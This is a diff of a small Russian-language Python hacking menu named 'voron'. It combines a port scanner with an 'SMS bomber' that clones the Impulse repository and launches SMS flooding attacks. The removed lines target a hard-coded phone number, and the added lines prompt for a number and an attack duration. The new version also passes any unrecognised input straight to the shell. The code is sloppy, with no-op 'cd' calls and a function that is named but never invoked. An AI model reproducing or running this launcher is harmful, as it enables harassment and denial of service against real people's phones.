@@ -1,68 +1,64 @@
 import socket
 import os
 import time
-#МОДУЛИ - smtplib
+os.system('clear')
 print('''
 \033[32mдоступ к системе voron открыт.
 ''')
 def a_1():
-#COD
-    def cod():
-        cod=input(': ')
-        cod=cod.lower()
-        if cod=='help':
-            helper()
-        elif cod=='port_scan':
-            port_scan()
-        elif cod=='autors':
-            autors()
-        elif cod=='ost':
-            ost()
-        elif cod=='o':
-            o()
-        elif cod=='voron':
-            vor()
-        elif cod=='im':
-            impulse()
-        elif cod=='im2':
-            impulse_2()
+    def enter():
+    
+        enter=input(': ')
+        enter=enter.lower()
+        if enter=='help':
+            b_6()
+        elif enter=='port_scan':
+            b_7()
+        elif enter=='autors':
+            b_8()
+        elif enter=='ost':
+            b_1()
+        elif enter=='o':
+            b_5()
+        elif enter=='voron':
+            b_9()
+        elif enter=='bomber':
+            b_3()
+        elif enter=='i':
+            b_2()
         else:
-            print('команда '+cod+' не найдена')
-    def ost():
+            os.system(enter)
+    def b_1():
         print('''
 o - очистка экрана.
 i - обновление пакетов данных, повышение мобильности работы системы.''')
-#HELP I
-    def i():
+    def b_2():
         os.system('pkg install python')
         os.system('pip install socket')
         os.system('pip install time')
-    def impulse():
-        os.system('git clone https://github.com/LimerBoy/Impulse')
-        os.system('cd Impulse')
-        os.system('pip3 install -r requirements.txt')
-        os.system('python impulse.py --method SMS --target 89995221600 --time 100--threads 2')
-    def impulse_2():
-        os.system('git clone https://github.com/LimerBoy/Impulse')
-        os.system('cd Impulse')
-        os.system('pip3 install -r requirements.txt')
-        number=input('номер: ')
-        sek=input('время в секундах: ')
-        os.system('python impulse.py --method SMS --target'+number+'--target '+sek+' --threads 2')
-#ОЧИСТКА
-    def o():
+        os.system('apt upgrade')
+        os.system('apt update')
+    def b_3():
+        os.system('clear')
+        os.system('cd lord')
+        block_1=open('block_1.txt','r')
+        block_1=block_1.read()
+        os.system('cd')
+        if 'impulse' in block_1:
+            c_1()
+        elif 'impulse' not in block_1:
+            c_1_2
+    def b_5():
         os.system('clear')
         a_1()
-#HELPER
-    def helper():
+    def b_6():
         print('''доступные команды:
 autors    - авторы программы voron.
 port_scan - сканер портов. Сканирует порты по IP адресу.
 voron     - полный доступ к системе.
 ost       - основные команды системы.
 ''')
-#PORT_SCAN
-    def port_scan():
+    def b_7():
         def openports(ip):
             x=1
             for port in [21, 22, 23, 25,31,41, 43, 45, 53,59, 68, 79, 80, 99, 110, 113, 115, 119, 121, 123, 135, 139, 143, 161, 179, 220, 389, 421, 443, 445, 456, 531, 555, 666, 911,
@@ -104,7 +100,7 @@ ost       - основные команды системы.
             openports(input('IP: '))
         if x=='2':
             openports2()
-    def autors():
+    def b_8():
         os.system(r'clear')
         print('W')
         time.sleep(0.1)    
@@ -152,55 +148,36 @@ ost       - основные команды системы.
         time.sleep(0.1)
         #        cx=input('введите любой символ для выхода в систему voron.\n: ')
         a_1()
-    def vor():
+    def b_9():
         x=input('код доступа: ')
         print('\033[31mотказано в доступе.')
-        a_1()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-        
+        a_1()     
+    def c_1():
+        number=input('номер: ')
+        time_atack=input('время атаки в секундах: ')
+        os.system('cd lord')
+        os.system('cd impulse')
+        os.system('python impulse.py --method SMS --target '+str(number)+' --time '+str(time_atack)+' --threads 2')
+        block_1.close()
+        os.system('cd')
+        os.system('clear')
+    def c_1_2():
+        y=input('\o33[31mрепозиторий impulse не установлен.\nустановить?[y/n]')
+        y=y.lower()
+        if y=='y':
+            os.system('cd')
+            os.system('cd lord')
+            block_1=open('block_1','a')
+            block_1=block_1.write('impulse')
+            os.system('git clone https://github.com/LimerBoy/Impulse')
+            os.system('pip3 install -r requirements.txt')
+            print('\033[32mimpulse успешно установлен.')
+            os.system('cd')
+            c_1()
+        elif y=='n':
+            a_1()
+    
+     
     while True:
-        cod()
-
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
+        enter()
 a_1()
